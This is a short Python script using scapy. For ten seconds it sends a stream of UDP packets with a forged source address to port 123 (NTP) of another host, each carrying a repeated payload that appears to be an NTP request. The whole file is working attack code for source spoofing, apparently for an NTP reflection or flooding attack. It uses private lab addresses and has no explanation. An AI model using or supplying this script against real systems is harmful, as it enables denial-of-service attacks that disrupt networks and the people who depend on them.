from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= RandShort()
D= 123
E= "\x1b\x1b\x03\x2a\x03\x2a\x00\x00" * 6

start = time.time()
while (time.time() - start < 10):
    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
    send(spoofed_packet)